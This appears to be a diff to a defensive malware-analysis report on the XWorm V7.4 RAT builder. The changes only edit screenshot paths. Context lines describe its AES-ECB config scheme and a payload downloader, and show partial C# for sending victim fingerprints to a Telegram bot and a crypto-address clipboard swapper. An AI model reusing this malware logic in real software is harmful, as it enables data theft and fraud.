@@ -26,48 +26,48 @@ This report documents the internals of the V7.4 builder of Xworm, and its defaul
 Version announcement screenshots from the V7 Telegram channel:
 
 **7.1:**
-![XWorm 7.1 announcement](TLPCLEAR_20260628_Xworm_V7_4/3acbf075-5499-4be3-9aa9-d8cc0c0ffab4.png)
+![XWorm 7.1 announcement](3acbf075-5499-4be3-9aa9-d8cc0c0ffab4.png)
 
 **7.2:**
-![XWorm 7.2 announcement](TLPCLEAR_20260628_Xworm_V7_4/6326121e-2b94-43f1-a4ad-c7656eb16aa2.png)
+![XWorm 7.2 announcement](6326121e-2b94-43f1-a4ad-c7656eb16aa2.png)
 
 **7.3:**
-![XWorm 7.3 announcement](TLPCLEAR_20260628_Xworm_V7_4/8227658f-043c-459b-aaad-d16415cd542e.png)
+![XWorm 7.3 announcement](8227658f-043c-459b-aaad-d16415cd542e.png)
 
 **7.4:**
-![XWorm 7.4 announcement](TLPCLEAR_20260628_Xworm_V7_4/445d1d0b-0b3c-499b-8318-1fe3bbf75475.png)
+![XWorm 7.4 announcement](445d1d0b-0b3c-499b-8318-1fe3bbf75475.png)
 
 **7.5:**
-![XWorm 7.5 announcement](TLPCLEAR_20260628_Xworm_V7_4/f5168c03-5290-4846-b003-4c1eab753f9e.png)
+![XWorm 7.5 announcement](f5168c03-5290-4846-b003-4c1eab753f9e.png)
 
 ## 3. Builder Analysis
 
 The builder package is distributed via the Ultimate-RAT-Collection repository. Its contents:
 
-![Builder package contents](TLPCLEAR_20260628_Xworm_V7_4/dcba0d2a-5afc-476f-a10e-127f914997ef.png)
+![Builder package contents](dcba0d2a-5afc-476f-a10e-127f914997ef.png)
 
 The main builder interface:
 
-![Builder main interface](TLPCLEAR_20260628_Xworm_V7_4/6b64e3aa-b63e-4979-b850-e61e1128de8a.png)
+![Builder main interface](6b64e3aa-b63e-4979-b850-e61e1128de8a.png)
 
 The V7.4 builder retains the same three-tab layout seen in prior versions:
 
 - **Connection** — C2 host(s)/port configuration
 
-  ![Connection tab](TLPCLEAR_20260628_Xworm_V7_4/ffa310f8-d3d0-4054-8669-9c6033fe8195.png)
+  ![Connection tab](ffa310f8-d3d0-4054-8669-9c6033fe8195.png)
 
 - **Settings** — persistence, jitter, optional parameters (toggle switches)
 
-  ![Settings tab](TLPCLEAR_20260628_Xworm_V7_4/62eed209-baea-43ae-af18-62a6286f4864.png)
+  ![Settings tab](62eed209-baea-43ae-af18-62a6286f4864.png)
 
 - **Build** — output executable generation, obfuscation selection
 
-  ![Build tab](TLPCLEAR_20260628_Xworm_V7_4/c6149a4d-7df7-46ee-8a72-c7542aa40d8a.png)
+  ![Build tab](c6149a4d-7df7-46ee-8a72-c7542aa40d8a.png)
 
 The builder also ships **extra tools**, including a standalone **Downloader** utility for staging secondary payloads:
 
-![Downloader tool](TLPCLEAR_20260628_Xworm_V7_4/10249881-b810-4603-869b-b8a349ba08fb.png)
-![Downloader tool configuration](TLPCLEAR_20260628_Xworm_V7_4/9082f58b-bf61-4d08-8c97-500337f76490.png)
+![Downloader tool](10249881-b810-4603-869b-b8a349ba08fb.png)
+![Downloader tool configuration](9082f58b-bf61-4d08-8c97-500337f76490.png)
 
 ## 4. Base Sample Analysis (Default Build — No Optional Features Enabled)
 
@@ -75,8 +75,8 @@ The builder also ships **extra tools**, including a standalone **Downloader** ut
 
 Configuration values are stored Base64-encoded and AES-encrypted inside the binary:
 
-![Encrypted configuration in the binary](TLPCLEAR_20260628_Xworm_V7_4/c8fccc59-412f-45ed-94c8-2a51a28c0926.png)
-![Encrypted configuration fields](TLPCLEAR_20260628_Xworm_V7_4/ecc9b3e2-acf5-4a4d-bda3-3525cd9e77f1.png)
+![Encrypted configuration in the binary](c8fccc59-412f-45ed-94c8-2a51a28c0926.png)
+![Encrypted configuration fields](ecc9b3e2-acf5-4a4d-bda3-3525cd9e77f1.png)
 
 The decryption key is derived from MD5 of the configured **mutex** string, used as a 32-byte AES key in **ECB mode with no IV**:
 
@@ -334,12 +334,12 @@ Inbound traffic is handled by an asynchronous socket-receive callback that reass
 
 Selected operator-side C2 panel capabilities observed in the builder:
 
-![C2 capability](TLPCLEAR_20260628_Xworm_V7_4/949f0ef4-1ccf-49eb-b8fa-2317051bc318.png)
-![C2 capability](TLPCLEAR_20260628_Xworm_V7_4/0b6aabab-e46c-401d-8419-42f763e5f31c.png)
-![C2 capability](TLPCLEAR_20260628_Xworm_V7_4/91c88c81-481c-4029-bd1c-54cf7ea89053.png)
-![C2 capability](TLPCLEAR_20260628_Xworm_V7_4/107334d1-b1b9-4da3-8080-7fe4f5a68e48.png)
-![C2 capability](TLPCLEAR_20260628_Xworm_V7_4/b243590e-58be-4fa8-b592-48868e41016a.png)
-![C2 capability](TLPCLEAR_20260628_Xworm_V7_4/4b4eac4d-8845-4ee9-a70b-4e30b317caa1.png)
+![C2 capability](949f0ef4-1ccf-49eb-b8fa-2317051bc318.png)
+![C2 capability](0b6aabab-e46c-401d-8419-42f763e5f31c.png)
+![C2 capability](91c88c81-481c-4029-bd1c-54cf7ea89053.png)
+![C2 capability](107334d1-b1b9-4da3-8080-7fe4f5a68e48.png)
+![C2 capability](b243590e-58be-4fa8-b592-48868e41016a.png)
+![C2 capability](4b4eac4d-8845-4ee9-a70b-4e30b317caa1.png)
 
 ### 4.7 Command Set
 
@@ -471,7 +471,7 @@ public static extern void SetCurrentProcessIsCritical([MarshalAs(UnmanagedType.B
 
 Sends an infection notification to an attacker-controlled Telegram bot, immediately after configuration is loaded:
 
-![TBotNotify build option](TLPCLEAR_20260628_Xworm_V7_4/beb2bd58-c07d-4aad-8bd7-343d314a2082.png)
+![TBotNotify build option](beb2bd58-c07d-4aad-8bd7-343d314a2082.png)
 
 ```csharp
 webClient.DownloadString(string.Concat(new string[]
@@ -491,7 +491,7 @@ The `text` parameter contains the full device fingerprint: Client ID, username, 
 
 A dedicated thread monitors the clipboard for content matching cryptocurrency-address regexes and silently swaps in an attacker-controlled address:
 
-![Clipper build option](TLPCLEAR_20260628_Xworm_V7_4/f164e261-08f5-46fa-bdbe-fef99ba5de93.png)
+![Clipper build option](f164e261-08f5-46fa-bdbe-fef99ba5de93.png)
 
 ```csharp
 new Thread(delegate
